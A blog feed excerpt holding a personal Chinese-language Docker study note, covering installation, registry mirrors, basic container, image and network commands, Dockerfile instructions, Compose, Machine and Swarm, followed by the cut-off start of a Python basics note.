    <content type="html"><![CDATA[<p>参考资料: </p><p><a href="https://www.runoob.com/docker/docker-tutorial.html" target="_blank" rel="noopener">菜鸟教程</a></p><p><strong>Docker 的优点</strong></p><blockquote><p>Docker 是一个用于开发，交付和运行应用程序的开放平台。Docker 使您能够将应用程序与基础架构分开，从而可以快速交付软件。借助 Docker，您可以与管理应用程序相同的方式来管理基础架构。通过利用 Docker 的方法来快速交付，测试和部署代码，您可以大大减少编写代码和在生产环境中运行代码之间的延迟。</p></blockquote><p>简而言之, 就是为了方便,快速</p><p><strong>Docker 架构</strong></p><p>Docker 包括上基本概念: </p><ul><li><strong>镜像（Image）</strong>：Docker 镜像（Image），就相当于是一个 root 文件系统</li><li><strong>容器（Container）</strong>：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等</li><li><strong>仓库（Repository）</strong>：仓库可看着一个代码控制中心，用来保存镜像</li></ul><p>Docker 使用<code>C/S</code>(<strong>客户端-服务器</strong>)架构模式.使用远程 API 来管理和创建Docker容器      </p><p><img src="https://www.runoob.com/wp-content/uploads/2016/04/576507-docker1.png" alt></p><p>安装教程就自己去网上找资料看了-.-</p><p>我是按照菜鸟教程来安装的,安装的版本为 <strong>5:18.09.1<del>3-0</del>ubuntu-bionic</strong></p><p>问了下实验室的师傅,<strong>如果只是复现漏洞,docker版本低没影响</strong>,如果要用docker开发就需要用最新版.</p><p>使用<code>sudo docker run hello-world</code> 来测试是否安装成功,真是什么都是hello world啊~</p><p> <a href="https://y0ngb1n.github.io/a/docker-registry-mirrors.html" target="_blank" rel="noopener">Docker hub 镜像加速</a></p><p>个人觉得下面这个设置了是成功的.可以先设置这个,节约下载时间.简直快到爽啊~</p><p><a href="https://www.jianshu.com/p/405fe33b9032" target="_blank" rel="noopener">Docker 中国源</a></p><p>在 <code>/etc/docker/daemon.json</code> 中复制下这段代码,修改 daemon,即可.</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>    #<span class="token string">"http://ovfftd6p.mirror.aliyuncs.com"</span><span class="token punctuation">,</span>(这个必须有阿里云服务器对应的ID<span class="token punctuation">)</span>    <span class="token string">"http://registry.docker-cn.com"</span><span class="token punctuation">,</span>    <span class="token string">"http://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">,</span>    <span class="token string">"http://hub-mirror.c.163.com"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"insecure-registries"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"registry.docker-cn.com"</span><span class="token punctuation">,</span>    <span class="token string">"docker.mirrors.ustc.edu.cn"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"debug"</span> <span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token property">"experimental"</span> <span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span></code></pre><p><strong>腾讯云换阿里云的源</strong></p><p><code>sudo vim /etc/apt/sources.list</code> G 到文件底部 <code>:1.,d</code> 删除所有 复制下面的内容,wq退出</p><p>更新一下apt-get</p><pre class=" language-bash"><code class="language-bash">deb http://mirrors.aliyuncs.com/ubuntu/ xenial main restricted universe multiversedeb http://mirrors.aliyuncs.com/ubuntu/ xenial-security main restricted universe multiversedeb http://mirrors.aliyuncs.com/ubuntu/ xenial-updates main restricted universe multiversedeb http://mirrors.aliyuncs.com/ubuntu/ xenial-proposed main restricted universe multiversedeb http://mirrors.aliyuncs.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyuncs.com/ubuntu/ xenial main restricted universe multiversedeb-src http://mirrors.aliyuncs.com/ubuntu/ xenial-security main restricted universe multiversedeb-src http://mirrors.aliyuncs.com/ubuntu/ xenial-updates main restricted universe multiversedeb-src http://mirrors.aliyuncs.com/ubuntu/ xenial-proposed main restricted universe multiversedeb-src http://mirrors.aliyuncs.com/ubuntu/ xenial-backports main restricted universe multiverse</code></pre><h1 id="Docker-使用"><a href="#Docker-使用" class="headerlink" title="Docker 使用"></a>Docker 使用</h1><p>Docker 允许在容器内允许应用程序,使用<code>docker run</code> 命令在容器内允许一个应用程序</p><pre><code>docker run ubuntu:15.10 /bin/echo &quot;Hello world&quot;</code></pre><ul><li>docker: Docker 的二进制执行文件</li><li>run: 与前面的docker 组合运行一个容器</li><li>ubuntu:15.10 指定运行的镜像</li><li>/bin/echo “Hello world” 在容器里执行的命令</li></ul><p><strong>运行交互式的容器</strong></p><p><code>-i -t</code> 参数</p><p><strong>-t:</strong> 在新容器内指定一个伪终端或终端</p><p><strong>-i:</strong> 允许你对容器内的标准输入 (STDIN) 进行交互</p><p>可以使用 exit 命令 或者使用 CTRL-D 退出容器 , 返回到当前的主机中</p><pre><code>docker run -d ubuntu:15.10 /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;</code></pre><p>这行命令将返回一个 容器 ID , 每个容器的ID 都是唯一的<code>44a24ceb189833ce6ef36e71ed98246400a61405786134a702fa7fd9de7e431c</code></p><p>通过<code>docker ps</code> 命令 来确认是否有容器在运行</p><p>输出的内容详情: </p><p><strong>CONTAINER ID:</strong> 容器 ID。我的就是 <code>44a24ceb1898</code></p><p><strong>IMAGE:</strong> 使用的镜像。</p><p><strong>COMMAND:</strong> 启动容器时运行的命令。</p><p><strong>CREATED:</strong> 容器的创建时间。</p><p><strong>STATUS:</strong> 容器状态。状态有7中,对应的意思和英文翻译成中文是一样的</p><p><strong>PORTS:</strong> 容器的端口信息和使用的连接类型（tcp\udp）。</p><p><strong>NAMES:</strong> 自动分配的容器名称。</p><p><strong>停止容器:</strong> </p><p><code>sudo docker stop 44a24ceb1898</code></p><p>使用后,可以使用<code>sudo docker ps</code> 来查看是否关闭</p><hr><h2 id="Docker-客户端"><a href="#Docker-客户端" class="headerlink" title="Docker 客户端"></a><strong>Docker 客户端</strong></h2><p>直接在终端中输入<code>docker</code> 就可以查看所有命令选项</p><p>可以看到<code>Usage:  docker [OPTIONS] COMMAND</code> </p><pre><code>Options:      --config string      Location of client config files (default &quot;/home/ubuntu/.docker&quot;)  -D, --debug              Enable debug mode  -H, --host list          Daemon socket(s) to connect to  -l, --log-level string   Set the logging level (&quot;debug&quot;|&quot;info&quot;|&quot;warn&quot;|&quot;error&quot;|&quot;fatal&quot;) (default &quot;info&quot;)      --tls                Use TLS; implied by --tlsverify      --tlscacert string   Trust certs signed only by this CA (default &quot;/home/ubuntu/.docker/ca.pem&quot;)      --tlscert string     Path to TLS certificate file (default &quot;/home/ubuntu/.docker/cert.pem&quot;)      --tlskey string      Path to TLS key file (default &quot;/home/ubuntu/.docker/key.pem&quot;)      --tlsverify          Use TLS and verify the remote  -v, --version            Print version information and quit</code></pre><p>查看命令帮助指南和Linux 命令一样,用 –help 即可</p><p><code>sudo docker ps -a</code> 查看所有容器,包括停止的</p><h2 id="容器使用"><a href="#容器使用" class="headerlink" title="容器使用"></a>容器使用</h2><p><strong>获取镜像</strong></p><p>本地如果没有 Ubuntu镜像,使用<code>sudo docker pull ubuntu</code> 命令来载入 Ubuntu镜像</p><p><strong>启动容器</strong></p><p><code>sudo docker run -it ubuntu /bin/bash</code></p><p>这些参数,上面也学习了,这里就列一点就行</p><blockquote><p><strong>/bin/bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 /bin/bash</p></blockquote><p>退出终端, 输入<code>exit</code> 即可</p><p><strong>启动已停止运行的容器</strong></p><p>查看所有容器 <code>docker ps -a</code></p><p><code>docker start + 容器ID</code> 启动一个已经停止的容器</p><p><strong>后台运行</strong></p><blockquote><p>在run后的参数 加上<code>-d</code> 就可以指定容器的运行模式,参数默认不进入容器</p></blockquote><p><strong>停止一个容器</strong></p><p><code>docker stop + 容器ID</code></p><p>停止的容器可以通过 <code>docker restart + 容器ID</code> 重启</p><p><strong>进入容器</strong></p><p>在使用了<code>-d</code>参数是,容器启动后会进入后台. 进入容器可以通过</p><ul><li>docker attach</li><li>docker exec (教程说推荐使用,因为推出容器终端不会导致容器的停止)</li></ul><p><strong>导入和导出容器</strong></p><ul><li><p>导出本地某个容器</p><p>使用<code>docker export+容器ID &gt; 要导入的本地文件名</code></p></li><li><p>导入容器快照</p><p><code>docker import</code> 即<code>docker/本地文件名 | docker import - 镜像名</code></p></li></ul><p>也可以通过 URL来导入<code>docker import http://example.com/....</code></p><p><strong>删除容器</strong></p><p>使用<code>docker rm</code> 命令. </p><p><code>docker rm -f +容器ID</code></p><p>使用<code>docker container prune</code> 清理掉所有处于终止状态的容器</p><p><strong>运行一个 Web 应用</strong></p><p>即在docker 容器中运行一个 Python Flask 应用来运行 web应用</p><p><code>sudo docker pull training/webapp</code> 载入镜像</p><p><code>sudo docker run -d -P training/webapp python app.p</code> </p><blockquote><p><code>-d</code> 让容器在后台运行, <code>-P</code> 让容器内部使用的网络端口映射到我们的使用的主机上</p></blockquote><p><code>0.0.0.0:32768-&gt;5000/tcp</code> docker 开放了 5000 端口( 默认的 Flask 端口 ) 映射到主机端口 32769 上,然后访问我的VPS的IP + 映射的端口后后,就可以看到这个Web 应用是成功了   </p><p><img src="https://i.loli.net/2020/02/10/4GLXzod3JuVcqNb.png" alt></p><p>可以通过 参数 <code>-p</code> 来设置不同的端口</p><p><img src="https://i.loli.net/2020/02/10/wfEBsb3e8oDr6ld.png" alt></p><p><img src="https://i.loli.net/2020/02/10/sMtSrLXIHZeodc9.png" alt></p><p><strong>网络端口的快捷方式</strong></p><p><code>docker port + 容器ID(或名字)</code> 可以查看指定ID(或名字)的容器的确定端口映射到宿主机的端口号</p><pre><code>ubuntu@VM-0-15-ubuntu:~$ sudo docker port gifted_darwin5000/tcp -&gt; 0.0.0.0:32768</code></pre><p><strong>查看 Web 应用程序日志</strong></p><p><code>docker logs + 容器ID或者名字</code></p><p><code>-f</code> 让 docker logs 像使用 tail -f 一样来输出容器内部的标准输出</p><p><strong>查看 Web 应用程序容器的进程</strong></p><p><code>docker top</code> 命令查看容器内部运行的进程</p><p><strong>检查 Web 应用程序</strong></p><p><code>docker inspect</code> 查看Docker 的底层信息,返回 JSON 文件记录容器的配置和状态信息</p><p><strong>停止,重启,移除 Web 应用容器</strong></p><ul><li><code>docker stop + 容器名字</code>(或者ID)</li><li><code>docker start + 容器名字</code>(或者ID)(重启已停止的容器) <code>docker restart</code> 重启运行中的</li><li><code>docker rm +容器名字</code>(或者ID) 删除不需要的容器,容器必须是停止状态</li></ul><p><code>docker ps -l</code> 查看最后一次创建的容器</p><h2 id="镜像使用"><a href="#镜像使用" class="headerlink" title="镜像使用"></a>镜像使用</h2><p>如果运行容器时, 镜像在本地中不存在, docker 就会自动从 docker 镜像仓库中下载,默认从 Docker hub</p><p><strong>列出镜像列表</strong></p><p><code>docker images</code> 列出本机上的镜像</p><ul><li><strong>REPOSITORY：</strong>表示镜像的仓库源</li><li><strong>TAG：</strong>镜像的标签( 同一个仓库源可以有多个 TAG, 代表仓库源的不同版本 ),如果在运行容器时,不指定版本,默认latest</li><li><strong>IMAGE ID：</strong>镜像ID</li><li><strong>CREATED：</strong>镜像创建时间</li><li><strong>SIZE：</strong>镜像大小</li></ul><p><strong>获取一个新的镜像</strong></p><p><code>docker pull</code>命令 来预先下载镜像</p><p><strong>查找镜像</strong></p><ul><li>可以在 Dokcer Hub 上搜索镜像 <a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a></li><li>使用 <code>docker search</code> 命令来搜索镜像</li></ul><p><strong>拖取镜像</strong></p><p><code>docker pull</code></p><p><strong>删除镜像</strong></p><p><code>docker rmi + 容器名字或ID</code> 我这里用 rmi 会报错, 要force,但是kill 又没有运行中,反而直接使用 rm 可以成功</p><p>看了看 rm 和 rmi 的区别</p><ul><li>rm : 删除一个或多个<strong>容器</strong></li><li>rmi: 删除一个或多个<strong>镜像</strong></li><li>prune: 删除不再使用的docker <strong>对象</strong></li></ul><p><strong>创建镜像</strong></p><p>有两种方式可以对镜像进行更改</p><ul><li>从已经创建的容器中更新镜像,然后提交这个镜像</li><li>使用 Dockerfile 指令来创建一个新的镜像</li></ul><p>在运行的镜像中, 使用<code>apt-get update</code> 来更新镜像 <code>exit</code> 退出</p><p><code>docker commit</code> 来提交容器副本</p><pre><code>ubuntu@VM-0-15-ubuntu:~$ sudo docker commit -m=&quot;has update&quot; -a=&quot;IFONLY&quot; f8766b35560d IFONLY/ubuntu:v2invalid reference format: repository name must be lowercaseubuntu@VM-0-15-ubuntu:~$ sudo docker commit -m=&quot;has update&quot; -a=&quot;IFONLY&quot; f8766b35560d ifonly/ubuntu:v2sha256:7d76c68f5309c2944e95cca81844c245fa309e953570152c180b3e92c4c2ddde</code></pre><ul><li><strong>-m:</strong> 提交的描述信息</li><li><strong>-a:</strong> 指定镜像作者</li><li><strong>e218edb10161：</strong>容器 ID</li><li><strong>runoob/ubuntu:v2:</strong> 指定要创建的目标镜像名</li></ul><p>然后就可以用我们创建的新镜像来启动一个容器</p><p><code>sudo docker run -t -i ifonly/ubuntu:v2 /bin/bash</code></p><p><strong>构建镜像</strong></p><p><code>docker build</code> 创建一个新的镜像,需要一个 Dockerfile 文件</p><p><code>docker build -t 用户名/镜像源 .</code></p><ul><li>-t : 指定要创建的目标镜像名</li><li>. : Dockerfile 文件所在目录, 也可指定绝对路径</li></ul><p><strong>设置镜像标签</strong></p><p><code>docker tag</code>命令,为镜像添加一个新的标签.</p><p>使用格式: </p><p><code>docker tag 镜像ID 用户名称/镜像源名(repository name) : 新的标签名(tag)</code></p><h2 id="容器连接"><a href="#容器连接" class="headerlink" title="容器连接"></a>容器连接</h2><p>前面也学习了,通过网络端口,映射技术来实现访问运行在 docker 容器内的服务</p><p><code>-P</code> 或 <code>-p</code> 参数来指定端口映射</p><p><strong>网络端口映射</strong></p><ul><li><strong>-P :</strong>是容器内部端口<strong>随机</strong>映射到主机的高端口</li><li><strong>-p :</strong> 是容器内部端口绑定到<strong>指定</strong>的主机端口</li></ul><p><code>docker run -d -p 127.0.0.1:5001:5000 training/webapp python app.py</code></p><p>指定容器绑定的网络地址,比如绑定到本地</p><p>不过, 这些都是默认绑定tcp端口,如果要绑定 UDP 端口, 可以在<strong>端口后面加上 /udp</strong></p><p><strong>Docker 容器互联</strong></p><p>端口映射并不是唯一把 docker 连接到另一个容器的方法</p><blockquote><p>docker 有一个连接系统允许将多个容器连接在一起，共享连接信息</p><p>docker 连接会创建一个父子关系，其中父容器可以看到子容器的信息</p></blockquote><p><strong>容器命名</strong></p><p>创建容器时, docker 会自动进行命名,可以使用<code>--name</code> 标识来命名容器</p><p><code>sudo docker run -d -p 4399:5000 --name ifonly training/webapp python app.py</code></p><p><strong>新建网络</strong></p><p><code>docker network create -d bridge + name</code></p><p><strong>-d</strong>：参数指定 Docker 网络类型，有 bridge、overlay。</p><p>使用<code>docker network ls</code> 可以列出当前的网络</p><p><strong>连接容器</strong></p><p>运行一个容器并连接到新建的 text-net</p><p><code>docker run -itd --name test1 --network test-net ubuntu /bin/bash</code></p><p>同样的方法再运行一个 test2</p><p>在test1容器中 <code>docker exec -it test1 /bin/bash</code> 执行一个交互式环境,然后ping test2</p><p>安装ping <code>apt-get update</code> <code>apt install iputils-ping</code></p><p>然后发现可以ping 通 ,就说明是成功连接了 从 test2 中 ping test1 也是成功的,说明 这两个容器已经建立了互联关系</p><p><strong>配置 DNS</strong></p><p>在宿主机的 <code>/etc/docker/daemon.json</code> 文件中增加以下内容来设置全部容器的 DNS</p><pre><code>{  &quot;dns&quot; : [    &quot;114.114.114.114&quot;,    &quot;8.8.8.8&quot;  ]}</code></pre><p>因为这个文件是 readonly 的, 所以使用 sudo 就可以了.设置后,需要重启 docker 才能生效</p><p><code>docker run -it --rm host_ubuntu  --dns=114.114.114.114 --dns-search=test.com ubuntu</code></p><ul><li><strong>-h HOSTNAME 或者 –hostname=HOSTNAME</strong>： 设定容器的主机名，它会被写到容器内的 /etc/hostname 和 /etc/hosts</li><li><strong>–dns=IP_ADDRESS</strong>： 添加 DNS 服务器到容器的 /etc/resolv.conf 中，让容器用这个服务器来解析所有不在 /etc/hosts 中的主机名</li><li><strong>–dns-search=DOMAIN</strong>： 设定容器的搜索域，当设定搜索域为 .example.com 时，在搜索一个名为 host 的主机时，DNS 不仅搜索 host，还会搜索 host.example.com</li></ul><h2 id="仓库管理"><a href="#仓库管理" class="headerlink" title="仓库管理"></a>仓库管理</h2><p>仓库( Repository ) 是集中存放镜像的地方.</p><p>Dokcer Hub 是Docker 官方维护的公共仓库 <a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a></p><p><strong>登录和登出,拉取镜像</strong></p><p><code>docker login</code> 和 <code>docker logout</code> </p><p>登录成功后就可以<code>docker search + 名字</code> 搜索要用的容器,然后<code>docker pull + 名字</code></p><p><strong>推送镜像</strong></p><p><code>docker push</code>  </p><p>因为推送镜像,必须使我们本地的镜像的名称和Docker 账户的名称相同,push前需要tag 本地的镜像</p><p><code>docker tag xxx username/xxx</code> </p><p><code>docker push username/xxx</code></p><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了<strong>一条条构建镜像所需的指令和说明</strong></p><p><strong>用Docker 定制镜像</strong></p><p><strong>FROM</strong>：定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx</p><p><strong>RUN</strong>：用于执行后面跟着的命令行命令</p><ul><li>shell 格式: </li></ul><p>RUN &lt;命令行参数&gt; 即在终端操作的shell命令</p><ul><li>exec 格式: </li></ul><p>RUN [“可执行文件”, “参数1”, “参数2”]</p><pre><code>RUN [&quot;./test.php&quot;, &quot;dev&quot;, &quot;offline&quot;] 等价于 RUN ./test.php dev offline</code></pre><p><strong>注意</strong>：Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大</p><p>可以使用续行符<code>\</code> 和<code>&amp;&amp;</code> 来连续一条指令,这样就只会创建一层</p><p><strong>开始构建镜像</strong></p><p>在 Dockerfile 文件的存放目录下,执行构建动作</p><p>我按照教程的来, 在目录下的 Dockerfile 构建一个 nginx:test( <strong>镜像名称:镜像标签</strong> )</p><pre><code>ubuntu@VM-0-15-ubuntu:~/Dockerfile$ sudo docker build -t nginx:test .Sending build context to Docker daemon  2.048kBStep 1/2 : FROM nginxlatest: Pulling from library/nginxbc51dd8edc1b: Already exists 66ba67045f57: Pull complete bf317aa10aa5: Pull complete Digest: sha256:ad5552c786f128e389a0263104ae39f3d3c7895579d45ae716f528185b36bc6fStatus: Downloaded newer image for nginx:latest ---&gt; 2073e0bcb60eStep 2/2 : RUN echo &#39;this is a locally image&#39; &gt; /usr/share/nginx/html/index.html ---&gt; Running in d466687eba61Removing intermediate container d466687eba61 ---&gt; dd822a81687aSuccessfully built dd822a81687aSuccessfully tagged nginx:test</code></pre><p><strong>上下文路径</strong></p><p>指令最后的那个 <code>.</code> 指的就是上下文路径</p><blockquote><p>上下文路径，是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。</p></blockquote><p>如果未说明最后一个参数, 那么就默认上下文路径为 Dockerfile 所在的路径</p><p>另外, 上下文路径不要放无用的文件,这样会使过程变慢</p><p><strong>COPY</strong></p><p>复制指令,从上下文目录中复制文件或者目录到容器里指定路径</p><pre><code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径1&gt;...  &lt;目标路径&gt;COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;源路径1&gt;&quot;,...  &quot;&lt;目标路径&gt;&quot;]</code></pre><p><strong>[–chown=:]</strong>：可选参数，用户改变复制到容器内文件的拥有者和属组</p><p><strong>&lt;源路径&gt;</strong>：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则</p><p><strong>CMD</strong></p><p>类似于 RUN 指令,用于运行程序</p><ul><li>CMD 用于在 docker run</li><li>RUN 用于在 docker build</li></ul><p>如果Dockerfile 中有多个 CMD指令,只有最后一个生效</p><pre><code>CMD [&quot;&lt;可执行文件或命令&gt;&quot;,&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...] </code></pre><p><strong>ENTRYPOINT</strong></p><p>与 CMD 类似,但是不会被 docker run 的命令行参数指定的指令所覆盖</p><pre><code>ENTRYPOINT [&quot;&lt;executeable&gt;&quot;,&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...]</code></pre><p>可以和CMD 一起使用,但是二者就存在区别了</p><pre><code>FROM nginxENTRYPOINT [&quot;nginx&quot;, &quot;-c&quot;] # 定参CMD [&quot;/etc/nginx/nginx.conf&quot;] # 变参 </code></pre><p><strong>ENV</strong></p><p>设置环境变量, 定义了环境变量,在后续的指令中,就可以使用这个环境变量</p><pre><code>ENV &lt;key&gt; &lt;value&gt;ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</code></pre><p><strong>ARG</strong></p><p>构建参数, 与 ENV 作用一样, 只是作用域不一样,<strong>ARG 设置的环境变量值对 Dockerfile 内有效</strong>,构建好的镜像内不存在这个环境变量</p><pre><code>ARG &lt;参数名&gt;[=&lt;默认值&gt;]</code></pre><p><strong>VOLUME</strong></p><p>定义匿名数据卷。在启动容器时忘记挂载数据卷，会自动挂载到匿名卷</p><p>匿名数据卷的作用: </p><ul><li>避免重要的数据，因容器重启而丢失，这是非常致命的。</li><li>避免容器不断变大。</li></ul><pre><code>VOLUME [&quot;&lt;路径1&gt;&quot;, &quot;&lt;路径2&gt;&quot;...]VOLUME &lt;路径&gt;</code></pre><p><strong>EXPOSE</strong></p><p>作用就是用来声明端口</p><ul><li>帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射</li><li>在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口</li></ul><pre><code>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</code></pre><p><strong>WORKDIR</strong></p><p>指定工作目录,用 WORKDIR 指定的工作目录,会在构建镜像的每一层中都存在.(必须提前创建好)</p><pre><code>WORKDIR &lt;工作目录路径&gt;</code></pre><p><strong>USER</strong></p><p>用于指定执行后续命令的用户和用户组( 必须提前创建好 )</p><pre><code>USER &lt;用户名&gt;[:&lt;用户组&gt;]</code></pre><p><strong>HEALTHCHECK</strong></p><p>用于指定某个程序或者指令来监控 docker 容器服务的运行状态</p><p><strong>ONBUILD</strong></p><p>用于延迟构建命令的执行</p><hr><h2 id="Compose"><a href="#Compose" class="headerlink" title="Compose"></a>Compose</h2><p><a href="https://github.com/docker/compose/releases" target="_blank" rel="noopener">https://github.com/docker/compose/releases</a></p><p>Compose 是用于<strong>定义和运行多容器 Docker</strong> 应用程序的工具 , 使用 Compose 的三个步骤</p><ul><li>使用 Dockerfile 定义应用程序的环境</li><li>使用 docker-compose.yml 定义构成应用程序的服务，这样它们可以在隔离环境中一起运行</li><li>最后，执行 docker-compose up 命令来启动并运行整个应用程序</li></ul><p>更多的需要 看这个 <a href="https://www.runoob.com/docker/docker-compose.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-compose.html</a> </p><p>不一一 Ctrl+C/V了</p><h2 id="Machine"><a href="#Machine" class="headerlink" title="Machine"></a>Machine</h2><p>安装</p><pre><code>base=https://github.com/docker/machine/releases/download/v0.16.0 &amp;&amp;  curl -L $base/docker-machine-$(uname -s)-$(uname -m) &gt;/tmp/docker-machine &amp;&amp;  sudo mv /tmp/docker-machine /usr/local/bin/docker-machine &amp;&amp;  chmod +x /usr/local/bin/docker-machine</code></pre><p>Docker Machine 是一种可以在虚拟主机上安装 Docker 的工具，并可以使用 docker-machine 命令来管理主机</p><p><a href="https://www.runoob.com/docker/docker-machine.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-machine.html</a></p><h2 id="Swarm-集群管理"><a href="#Swarm-集群管理" class="headerlink" title="Swarm 集群管理"></a>Swarm 集群管理</h2><p>Docker Swarm 是 Docker 的集群管理工具。它将 Docker 主机池转变为单个虚拟 Docker 主机。 Docker Swarm 提供了标准的 Docker API，所有任何已经与 Docker 守护程序通信的工具都可以使用 Swarm 轻松地扩展到多个主机</p><p>支持的工具有: </p><ul><li>Dokku</li><li>Docker Compose</li><li>Docker Machine</li><li>Jenkins</li></ul><p>swarm 集群管理 由管理节点 和 工作节点构成<img src="https://www.runoob.com/wp-content/uploads/2019/11/services-diagram.png" alt></p><p><a href="https://www.runoob.com/docker/docker-swarm.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-swarm.html</a></p><h1 id="Dokcer-实例"><a href="#Dokcer-实例" class="headerlink" title="Dokcer 实例"></a>Dokcer 实例</h1><h2 id="Docker-安装-ubuntu"><a href="#Docker-安装-ubuntu" class="headerlink" title="Docker 安装 ubuntu"></a>Docker 安装 ubuntu</h2><p>前面的学习中就是以这个为例子的,不多介绍了</p><ul><li>sudo docker run -itd –name ubuntu-test ubuntu</li><li>sudo docker exec -it ubuntu-test /bin/bash</li></ul><h2 id="Docker-安装-CentOS"><a href="#Docker-安装-CentOS" class="headerlink" title="Docker 安装 CentOS"></a>Docker 安装 CentOS</h2><p>和安装 ubuntu 差不多</p><p>参考 <a href="https://www.runoob.com/docker/docker-install-centos.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-install-centos.html</a> </p><h2 id="Docker-安装Nginx"><a href="#Docker-安装Nginx" class="headerlink" title="Docker 安装Nginx"></a>Docker 安装Nginx</h2><p>PHP , MYSQL,</p><p>等….</p><p>这个我感觉需要环境的时候直接找到教程输入命令就行了 0.0</p><p><strong>“If you really believe in what you’re doing, work hard, take nothing personally and if something blocks one route, find another. Never give up.”</strong></p><p>​              </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;参考资料: &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.runoob.com/docker/docker-tutorial.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;菜鸟教程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Docker 
      
    
    </summary>
    
    
      <category term="容器技术" scheme="https://hack-for.fun/categories/%E5%AE%B9%E5%99%A8%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="Docker" scheme="https://hack-for.fun/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Python_Basic_Learning_Note</title>
    <link href="https://hack-for.fun/posts/20200209/"/>
    <id>https://hack-for.fun/posts/20200209/</id>
    <published>2020-02-08T16:00:00.000Z</published>
    <updated>2020-02-09T10:30:45.681Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一部分-Python编程基础"><a href="#第一部分-Python编程基础" class="headerlink" title="第一部分: Python编程基础"></a>第一部分: Python编程基础</h1><h1 id="0x01-Python基础"><a href="#0x01-Python基础" class="headerlink" title="0x01    Python基础"></a>0x01    Python基础</h1><p>Python 的<strong>数学操作符</strong></p><ul><li><code>**</code> 指数运算</li><li><code>%</code> 取模/取余运算</li><li><code>//</code> 整除/商数取整</li><li><code>/</code> <code>*</code> <code>-</code> <code>+</code> 当然就是”加减乘除”咯</li></ul><p>其中,<code>优先级</code>与数学中的运算优先级类似,优先级排名<code>**</code>然后是<code>*,/,//,%</code>,最后是<code>+ -</code> ,从左到右</p><p><strong>数据类型</strong></p><p>数据类型和C中差不多,有<code>整型,浮点型和字符串数据类型</code>,其中<code>表达式</code>是<code>值和操作符</code>的组合可以通过求值称为单个值.”数据类型”是一类值,每个值都只属于一种<code>数据类型</code></p><p>整型(int),也就是整数;浮点型(float),就是带有小数点;字符串(strs),就是有单引号或双引号中的,比如<code>&#39;aaa&#39;</code> </p><p>程序中的文本值,就是字符串,总是用单引号扩住</p><p>字符串连接使用<code>+</code>,这与数学运算中的<code>+</code>可以一样理解,只不过字符串需要用单引号括住</p><p><code>值</code>我们都是存入在变量中,当然除<code>1+1</code>这种直接的运算或者<code>&#39;if&#39;+&#39;only&#39;</code> 不需要,但是非要这样做也不是不行.</p><p><strong>赋值语句</strong>,几乎所有的编程语言,通过<code>=</code>来对变量进行<strong>赋值</strong>,</p><p>赋值语句,包含一个<strong>变量名</strong>,一个等号,一个值,比如<code>a = 666</code>的意思就是将6这个值赋给变量a,变量a就保存了6这个值,就是这么简单.第一次给变量赋值了后,这个变量就相当于被<strong>初始化或者创建</strong>,以后就可以使用这个变量,从而获取变量的值,但是如果变量又得到了一个新值,那么之前的那个值就没有了</p><p>变量名,只能是字母,数字,下划线,不能以数字开头,不能空格,以及其他的特殊符号,区分大小写,在Python中变量用小写是惯例</p><p>在Python中,使用<code>#</code>来对程序进行一些注释</p><p><code>str()</code>函数,求出传入值的字符串形式,<code>int()</code> 求整,<code>float</code>求浮点数,<code>input()</code>函数返回值为字符串形式,<code>len()</code>求字符串长度</p><blockquote><p>数字的字符串与整型和浮点型完全不同,但是整型值可以和浮点值相等</p></blockquote><p><code>round()</code>函数在py2和py3中的差异</p><p><img src="https://i.loli.net/2020/02/05/RbJCFEAXeusIQ4i.png" alt></p><p><img src="https://i.loli.net/2020/02/05/GYdnRSs6EuObWkA.png" alt></p><p>在py2中,进行四舍六入,如果距离两端一样远,则保留到离0远的一边,.</p><p>在py3中,如果距离两边一样远,保留到偶数的一边.</p><p><a href="https://www.runoob.com/w3cnote/python-round-func-note.html" target="_blank" rel="noopener">https://www.runoob.com/w3cnote/python-round-func-note.html</a></p><h1 id="0x02-控制流"><a 